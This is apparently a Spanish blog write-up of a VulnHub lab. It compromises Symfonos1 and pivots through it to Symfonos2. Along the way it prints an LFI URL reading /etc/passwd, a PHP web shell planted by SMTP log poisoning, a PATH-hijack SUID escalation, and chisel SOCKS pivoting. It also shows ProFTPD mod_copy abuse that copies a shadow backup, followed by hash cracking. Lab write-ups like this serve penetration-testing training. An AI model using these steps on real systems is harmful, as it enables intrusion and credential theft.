---
title: VH - Symfonos1 -> Symfonos2 ( Pivoting Lab )
published: true
categories: [Linux]
tags: [eCPPTv2, eWPT, eJPT, eCPTXv2, Pivoting, Fácil, Media]
---

<img src="/assets/VH/vulnhub.png">

¡Hola!
Vamos a resolver de la máquina [Symfonos1](https://www.vulnhub.com/entry/symfonos-1,322/) de dificultad "Fácil" de la plataforma `VulnHub` para posteriormente hacer pivoting a la máquina [Symfonos2](https://www.vulnhub.com/entry/symfonos-2,331/) de dificultad "Media" de la plataforma `VulnHub`

Técnicas Vistas (Symfonos1): 

- **Note: On this machine we have configured an internal network to Pivot to Symfonos2**
- **SMB Enumeration**
- **Information Leakage**
- **WordPress Enumeration**
- **Abusing WordPress Plugin - Mail Masta 1.0**
- **Local File Inclusion (LFI)**
- **LFI + Abusing SMTP service to achieve RCE**
- **Abusing SUID privilege + PATH Hijacking [Privilege Escalation]**
- **EXTRA: Pivoting Lab with Symfonos 2**

Técnicas Vistas (Symfonos2): 

- **EXTRA: Creation of bash script to discover computers on the internal network**
- **EXTRA: Creation of a bash script to discover the open ports of the computers discovered in the internal network**
- **EXTRA: Remote Port Forwarding - Playing with Chisel (From Symfonos 1)**
- **EXTRA: Socks5 connection with Chisel (Pivoting) (From Symfonos 1)**
- **EXTRA: FoxyProxy + Socks5 Tunnel**
- **EXTRA: Port enumeration with nmap through proxychains**
- **SMB Enumeration**
- **FTP Exploitation - Abusing SITE CPFR/CPTO**
- **Abusing FTP & SMB - Obtaining files from the machine**
- **SSH Connection via Proxychains**
- **SSH + Local Port Forwarding in order to access internal LibreNMS**
- **Playing with socat to define connection flow**
- **LibreNMS Exploitation (User Pivoting) [RCE]**
- **Abusing sudoers privilege (mysql) [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Symfonos1`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento (Symfonos1)

* * *

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:8d:05:79, IPv4: 192.168.1.148
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.130	1e:be:cd:3e:7d:44	(Unknown: locally administered)
192.168.1.131	ac:67:84:98:f6:07	(Unknown)
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.128	00:55:da:56:56:66	IEEE Registration Authority
192.168.1.145	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.150	00:0c:29:66:05:2c	VMware, Inc.
192.168.1.143	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
192.168.1.139	06:02:44:3c:f1:88	(Unknown: locally administered)
192.168.1.137	f4:34:f0:50:7e:76	(Unknown)
192.168.1.147	d8:a3:5c:73:eb:02	(Unknown)
192.168.1.151	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.150`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```ruby
❯ ping -c 1 192.168.1.150
PING 192.168.1.150 (192.168.1.150) 56(84) bytes of data.
64 bytes from 192.168.1.150: icmp_seq=1 ttl=64 time=42.3 ms

--- 1192.168.1.149 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.150 -oG allPorts

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
25/tcp  open  smtp         syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
nmap -sCV -p22,80 192.168.1.150 -oN targeted

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:61:46:45 (VMware)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe: o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-11-17T17:21:35
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2022-11-17T11:21:35-06:00
```

### Reconocimiento Web (Symfonos1)

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://192.168.1.150
http://192.168.1.150 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.1.150]
```

Accedemos al servicio http y observamos una imagen estática sin funcionalidad

<img src="/assets/VH/Symfonos1-Symfonos2/web.png">

### Reconocimiento SMB (Symfonos1)

* * *

Comenzamos enumerando servicios compartidos a nivel de red. Localizamos un recurso `anonymous` al cual podemos acceder sin credenciales. Listando su contenido vemos un archivo `attention.txt`, lo descargamos a nuestro equipo y listamos su contenido 

```ruby
❯ smbclient -L //192.168.1.150/ -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	helios          Disk      Helios personal share
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
❯ smbclient //192.168.1.150/anonymous -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jun 29 03:14:49 2019
  ..                                  D        0  Sat Jun 29 03:12:15 2019
  attention.txt                       N      154  Sat Jun 29 03:14:49 2019

		19994224 blocks of size 1024. 17279824 blocks available
smb: \> get attention.txt 
getting file \attention.txt of size 154 as attention.txt (50,1 KiloBytes/sec) (average 50,1 KiloBytes/sec)
smb: \> exit
❯ cat attention.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: attention.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 
   3   │ 
   4   │ Next person I find using one of these passwords will be fired!
   5   │ 
   6   │ -Zeus
   7   │ 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Parece que se están utilizando contraseñas no muy 'seguras'. Detectamos en la enumeración SMB una carpeta compartida del usuario `helios`. Con la herramienta `smbmap` nos conectamos al servicio SMB con la contraseña `qwerty`, ahora ya podemos acceder al directorio personal de helios. Localizamos dos archivos `research.txt` y `todo.txt`, nos los descargamos a nuestro directorio de trabajo

```ruby
❯ smbmap -H 192.168.1.150 -u helios -p qwerty
[+] IP: 192.168.1.150:445	Name: symfonos.local                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	helios                                            	READ ONLY	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)

❯ smbmap -H 192.168.1.150 -u helios -p qwerty -r helios
[+] IP: 192.168.1.150:445	Name: symfonos.local                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	helios                                            	READ ONLY	
	.\helios\*
	dr--r--r--                0 Sat Jun 29 02:32:05 2019	.
	dr--r--r--                0 Wed Dec 28 11:22:32 2022	..
	fr--r--r--              432 Sat Jun 29 02:32:05 2019	research.txt
	fr--r--r--               52 Sat Jun 29 02:32:05 2019	todo.txt    
```

El contenido de `research.txt` no es relevante pero encontramos una posible ruta en el archivo `todo.txt`

```ruby
❯ cat todo.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: todo.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ 1. Binge watch Dexter
   3   │ 2. Dance
   4   │ 3. Work on /h3l105
   5   │ 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Parece que nos econtramos ante un WordPress pero no cargan bien los recursos. Examinando el código fuente vemos que los recursos apuntan al dominio `symfonos.local`, agregamos a nuestro `/etc/hosts`

<img src="/assets/VH/Symfonos1-Symfonos2/wp.png">

<img src="/assets/VH/Symfonos1-Symfonos2/wpok.png">

Seguimos con la herramienta `wpscan` enumerando posibles plugins vulnerables. Encontramos plugin `Mail Masta` vulnerable a `LFI`

```ruby
❯ wpscan --url http://symfonos.local/h3l105/ --enumerate vp --plugins-detection aggressive --plugins-version-detection aggressive
.
.
| [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
 |      - https://www.exploit-db.com/exploits/40290/
 |      - https://www.exploit-db.com/exploits/50226/
 |      - https://cxsecurity.com/issue/WLB-2016080220
 |
.
.
```

Con la herramienta `searchsploit` buscamos vulnerabiliadades del plugin `Mail Masta` y econtramos un archivo txt donde nos explican como explotar el `LFI`. Nos indican el el PoC cómo listar el archivo `/etc/passwd`

```bash
Typical proof-of-concept would be to load passwd file:

http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Probamos en nuestra máquina víctima y confirmamos que funciona

<img src="/assets/VH/Symfonos1-Symfonos2/passwd.png">

Volviendo a la enumeración de puertos abiertos recordemos que tenemos el puerto 25 con el servicio `SMTP` funcionando. Listamos el contenido de la ruta `/var/mail/helios`

<img src="/assets/VH/Symfonos1-Symfonos2/varmailhelios.png">

Como tenemos acceso a los logs del servicio smtp y sabemos que el LFI apunta a un recurso en PHP vamos a tratar de ejecutar un `Log Poisoning` inyectando un código en PHP para que lo interprete y así lograr un `RCE`. Para realizar esta acción nos conectaremos a la máquina víctima por telnet a tarvés del puerto 25

```ruby
❯ telnet 192.168.1.150 25
Trying 192.168.1.150...
Connected to 192.168.1.150.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: yorch 
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>
.
250 2.0.0 Ok: queued as 593FE40BA2
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

Verificamos el log del usuario helios y comprobamos que nuestro código está presente

<img src="/assets/VH/Symfonos1-Symfonos2/poison.png">

Agregando `&cmd=id` a la url logramos ejecutar el comando `id` en la máquina víctima

<img src="/assets/VH/Symfonos1-Symfonos2/rce.png">

Nos ponemos en escucha en el puerto 443 y ejecutamos oneliner para entablar una reverse shell

<img src="/assets/VH/Symfonos1-Symfonos2/revshell.png">

```ruby
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.150] 41714
bash: cannot set terminal process group (571): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ whoami
whoami
helios
```

### Escalada de Privilegios (Symfonos1)

* * *

Comenzamos la enumeración para la escalada de privilegios, listando grupos y privilegios de sudo no econtramos nada interesante. Buscamos por archivos con privilegios SUID y localizamos un binario `/opt/statuscheck`. Ejecutamos y observamos output

```bash
bash-4.4$ ./statuscheck 
HTTP/1.1 200 OK
Date: Mon, 02 Jan 2023 09:41:17 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html
```

Listando cadenas de caracteres del binario vemos que está ejecutando un `curl` a localhost

```bash
bash-4.4$ strings statuscheck 
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
.
.
.
```

Nos dirigimos al directorio `/dev/shm` y creamos nuestro propio `curl` el cual asignará privilegios SUID a la bash. Mediante `Path Hijacking` haremos que el binario ejecute nuestro `curl` malicioso

```ruby
bash-4.4$ pwd
/dev/shm
bash-4.4$ cat curl 
chmod u+s /bin/bash
bash-4.4$ export PATH=.:$PATH
bash-4.4$ /opt/statuscheck 
bash-4.4$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
```

Lanzamos bash con privilegios de root con `bash -p`

```ruby
bash-4.4$ bash -p
bash-4.4# whoami
root
```

Hemos completado la máquina **Symfonos1** de VulnHub!!

### Reconocimiento (Symfonos2)

* * *

Iniciamos el reconocimiento de la máquina `Symfonos2`. Necesitamos saber su IP y los puertos abiertos que tiene esta máquina. Para ello nos haremos un pequeño script en bash el cual nos ayudará con la tarea. Sabiendo que la IP de la máquina Symfonos en el segmento es 10.10.0.141 vamos a escanear todas las IP en el segmento `10.10.0.0/24`

```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVO" &
done; wait
```
```bash
bash-4.4# ./hostDiscovery.sh 
[+] Host 10.10.0.1 - ACTIVO
[+] Host 10.10.0.137 - ACTIVO
[+] Host 10.10.0.141 - ACTIVO
```
Ya sabemos que la IP de la máquina `Symfonos2` es la 10.10.0.137. Ahora procedemos a enumerar los puertos abiertos mediante otro script en bash

```bash
#!/bin/bash

for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.137/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
bash-4.4# ./portDiscovery.sh 
[+] Port 22 - OPEN
[+] Port 21 - OPEN
[+] Port 80 - OPEN
[+] Port 139 - OPEN
[+] Port 445 - OPEN
```
A partir de este punto para trabajar más cómodamente vamos a crear un túnel por el cual nos vamos a poder acceder a la máquina `Symfonos2` desde nuestra equipo atacante a pesar de no tener conexión directa al no estar en el mismo segmento. Para esta tarea utilizaremos la herarmienta `chisel` la cual debemos subir a la máquina `Symfonos` que es la que está en el mismo segmento que la `Symfonos2`. Los ejecutaremos de la siguiente forma

```bash
#Atacante
❯ ./chisel server --reverse -p 1234
2023/01/02 11:01:42 server: Reverse tunnelling enabled
2023/01/02 11:01:42 server: Fingerprint SLf70qZ8u1T/5WfZrBSnlsTXOZJy7f/w6elCaFW8bWU=
2023/01/02 11:01:42 server: Listening on http://0.0.0.0:1234
2023/01/02 11:02:08 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
#Inferno
bash-4.4# ./chisel client 192.168.1.148:1234 R:socks
2023/01/02 04:02:09 client: Connecting to ws://192.168.1.148:1234
2023/01/02 04:02:09 client: Connected (Latency 639.323µs)
```
Añadimos al firefox una regla en el add-on Foxy proxy de la siguiente forma y ya podemos acceder por el navegador directamente a la máquina `Symfonos2` por el puerto 80

<img src="/assets/VH/Symfonos1-Symfonos2/web2.png">

Continuamos con la enumeración de los **500** puertos más comunes en la máquina.

```ruby
❯ proxychains nmap -p- --top-ports 500 --open -T5 -v -n -sT -Pn 10.10.0.137 2>&1 -oG allPorts | grep -vE "timeout|OK"

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
proxychains nmap -sT -Pn -sCV -p21,22,80,139,445 10.10.0.137 -oN targeted

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-title: Site doesn t have a title (text/html).
|_http-server-header: webfs/1.21
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe: o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-02T10:18:41
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2023-01-02T04:18:42-06:00
|_clock-skew: mean: 2h00m02s, deviation: 3h27m53s, median: 0s
```

### Reconocimiento SMB (Symfonos2)

* * *

Comenzamos enumerando servicios compartidos a nivel de red. Localizamos un recurso `anonymous/basckups` al cual podemos acceder sin credenciales. Listando su contenido vemos un archivo `log.txt`, lo descargamos a nuestro equipo y listamos su contenido

```ruby
❯ proxychains smbmap -H 10.10.0.137 -r anonymous/backups
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:445-<><>-OK
[+] Guest session   	IP: 10.10.0.137:445	Name: 10.10.0.137                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymousbackups\*
	dr--r--r--                0 Thu Jul 18 16:25:17 2019	.
	dr--r--r--                0 Wed Dec 28 12:15:44 2022	..
	fr--r--r--            11394 Thu Jul 18 16:25:16 2019	log.txt
```
En la primera línea del log encontramos algo interesante. Parece ser que en algún momento el usuario root realiza una copia del archivo `shadow` en el directorio `/var/backups`. También observamos que el recurso compartido `anonymous` del cual sacamos el log está sincronizado con el directorio `/home/aeolus/share` del usuario `aeolus`

```ruby
❯ cat log.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: log.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
   2   │ root@symfonos2:~# cat /etc/samba/smb.conf
.
.
.
[anonymous]
 258   │    path = /home/aeolus/share
 259   │    browseable = yes
 260   │    read only = yes
 261   │    guest ok = yes
.
.
.
```

### Explotación ProFTPD (Symfonos2)

* * *

Volviendo a los servicios encontrados vemos que en el puerto 21 hay una versión un poco antigua de `ProFTPD`. Buscamos vulnerabilidades asociadas a este servicio

```ruby
❯ searchsploit proftpd 1.3.5
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                                       | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                                             | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                                         | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                                       | linux/remote/36742.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

Si observamos el contenido de `linux/remote/36742.txt` vemos que podemos copiar archivos de la máquina a un directorio determinado

```ruby
---------------------------------
Trying 80.150.216.115...
Connected to 80.150.216.115.
Escape character is '^]'.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
site help
214-The following SITE commands are recognized (* => s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@www01a
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /tmp/passwd.copy
250 Copy successful
-----------------------------------------
```

Procedemos a conectarnos al servicio FTP y copiar el archivo `/var/backups/shadow.bak` al directorio `/home/aeolus/share` al cual tenemos acceso por SMB

```ruby
❯proxychains ftp 10.10.0.137
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:21-<><>-OK
Connected to 10.10.0.137.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.0.137]
Name (10.10.0.137:yorch): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> site help
214-The following SITE commands are recognized (* => s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@symfonos2
ftp> site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/shadow.bak
250 Copy successful
```
Si listamos el contenido del recurso compartido `anonymous` vemos que tenemos la copia del archivo `shadow.bak`. Nos lo descargamos y crackeamos el hash para obtener la contraseña del usuario `aeolus`

```ruby
❯ proxychains smbmap -H 10.10.0.137 -r anonymous
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:445-<><>-OK
[+] Guest session   	IP: 10.10.0.137:445	Name: 10.10.0.137                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Wed Dec 28 12:15:44 2022	.
	dr--r--r--                0 Thu Jul 18 16:29:08 2019	..
	dr--r--r--                0 Thu Jul 18 16:25:17 2019	backups
	fr--r--r--             1173 Mon Jan  2 12:08:19 2023	shadow.bak
```

```ruby
❯ john -w:/usr/share/wordlists/rockyou.txt shadow.bak
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Remaining 2 password hashes with 2 different salts
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sergioteamo		(aeolus)
```

Con las credenciales obtenidas nos podemos conectar por SSH a la máquina víctima

```ruby
❯ proxychains ssh aeolus@10.10.0.137
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:22-<><>-OK
aeolus@10.10.0.137 s password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Dec 28 05:33:17 2022 from 10.10.0.141
aeolus@symfonos2:~$ hostname -I
10.10.0.137 
```

### Explotación LibreNMS (Symfonos2)

* * *

Listando grupos y privilegios de sudo no localizamos nada interesante. Seguimos listando puertos internos abiertos y localizamos puerto 8080

```ruby
aeolus@symfonos2:~$ ss -nltp
State      Recv-Q Send-Q                                                                    Local Address:Port                                                                                   Peer Address:Port              
LISTEN     0      80                                                                            127.0.0.1:3306                                                                                              *:*                  
LISTEN     0      50                                                                                    *:139                                                                                               *:*                  
LISTEN     0      128                                                                           127.0.0.1:8080                                                                                              *:*                  
LISTEN     0      32                                                                                    *:21                                                                                                *:*                  
LISTEN     0      128                                                                                   *:22                                                                                                *:*                  
LISTEN     0      20                                                                            127.0.0.1:25                                                                                                *:*                  
LISTEN     0      50                                                                                    *:445                                                                                               *:*                  
LISTEN     0      50                                                                                   :::139                                                                                              :::*                  
LISTEN     0      64                                                                                   :::80                                                                                               :::*                  
LISTEN     0      128                                                                                  :::22                                                                                               :::*                  
LISTEN     0      20                                                                                  ::1:25                                                                                               :::*                  
LISTEN     0      50                                                                                   :::445                                                                                              :::*                  
```

Mediante SSH aplicamos port forwarding para traernos el puerto 8080 a nuestra máquina

```ruby
❯ proxychains ssh aeolus@10.10.0.137 -L 8080:127.0.0.1:8080
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:22-<><>-OK
aeolus@10.10.0.137 s password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan  2 05:13:19 2023 from 10.10.0.141
```
En nuestro navegador accedemos a `localhost:8080` y vemos un panel de login de `LibreNMS`

<img src="/assets/VH/Symfonos1-Symfonos2/libre.png">

Reutilizando credenciales de `aeolus` nos conectamos al dashboard de LibreNMS

<img src="/assets/VH/Symfonos1-Symfonos2/dashboard.png">

Buscamos vulnerabilidades asociadas a LibreNMS y localizamos un script en python que nos derica a un RCE

```ruby
 searchsploit librenms
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
LibreNMS - addhost Command Injection (Metasploit)                                                                                                                                               | linux/remote/46970.rb
LibreNMS - Collectd Command Injection (Metasploit)                                                                                                                                              | linux/remote/47375.rb
LibreNMS 1.46 - 'addhost' Remote Code Execution                                                                                                                                                 | php/webapps/47044.py
LibreNMS 1.46 - 'search' SQL Injection                                                                                                                                                          | multiple/webapps/48453.txt
LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection                                                                                                                                | multiple/webapps/49246.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

Viendo el contenido del script en python `47044.py` entendemos que hay que inyectar un payload en el campo `community` de la ruta `/addhost`. Indicamos Ip de la máquina Symfonos1 por el puerto 4646

<img src="/assets/VH/Symfonos1-Symfonos2/pwned.png">

